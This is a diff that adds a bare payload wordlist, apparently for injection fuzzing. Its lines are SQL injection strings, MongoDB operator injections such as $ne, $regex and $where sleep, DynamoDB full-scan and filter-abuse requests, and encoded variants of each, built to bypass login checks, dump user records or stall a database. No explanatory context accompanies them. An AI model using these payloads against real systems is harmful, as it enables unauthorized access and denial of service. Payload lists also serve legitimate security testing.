@@ -1,1 +1,48 @@
-
+' OR '1'='1
+%27%20OR%20%271%27%3D%271
+{"ScanIndexForward": false, "Limit": 1000000}
+{"FilterExpression": "contains(username, 'a')"}
+\u0027 OR \u00271\u0027=\u00271
+{"KeyConditionExpression": "username = :val", "ExpressionAttributeValues": {":val": {"S": "admin OR 1=1"}}}
+%2527%20OR%20%25271%2527%3D%25271
+{"username": {"$regex": ".*"}}
+{"username": {"$in": [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50]}}
+'; sleep(5);
+{"$or": [{"username": "admin"}, {"$where": "sleep(5000)"}]}
+{"username": {"$ne": null}}
+%7B%22username%22%3A%20%7B%22%24ne%22%3A%20null%7D%7D
+{"username": {"$gt": ""}}
+\u007B"username": {"$ne": null}\u007D
+{"FilterExpression": "begins_with(username, #p)", "ExpressionAttributeNames":{"#p":"a"}}
+{"KeyConditionExpression": "username BETWEEN :a AND :z", ":a":"", ":z":"\uffff"}
+{"username": {"$exists": true}}
+{"$and": [{"username": {"$regex": "^a"}}, {"$where": "sleep(5000)"}]}
+' OR true --
+%27%20OR%20true%20--
+{"username": "admin' OR '1'='1"}
+{"username": {"$regex": "admin|.*"}}
+{"ProjectionExpression": "username, large_field1, large_field2"}
+{"ConsistentRead": true, "Limit": 1000000}
+{"FilterExpression": "attribute_exists(username)"}
+%2527%20OR%20true%20--
+\u0027 OR true --
+{"username": {"$type": "string"}}
+{"$or": [ {}, {"username": "admin"} ]}
+{"username": {"$nin": []}}
+{"username": {"$eq": {"$func": "sleep(5)"}}}
+'; return sleep(5);
+{"$where": "function(){sleep(5000)}"}
+%7B%22%24where%22%3A%22function%28%29%7Bsleep%285000%29%7D%22%7D
+{"username": "admin//OR//1=1"}
+{"username": "a d m i n ' O R ' 1 = ' 1"}
+{"FilterExpression": "username = #u OR #d = #d", "#u":"admin", "#d":1}
+{"KeyConditionExpression": "username = :u OR 1=:one", ":u":"admin", ":one":1}
+' AND SLEEP(5) --
+' AND BENCHMARK(1000000,MD5(1)) --
+{"username": {"$regex": ".*", "$options": "s"}}
+{"username": {"$all": [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30]}}
+{"Scan": true}
+{"Limit": 0}
+{"ExclusiveStartKey": {"username": {"S": "a"}}, "Limit": 1000000}
+{"FilterExpression": "size(username) > 0"}
+{"username": {"$begins_with": ""}}
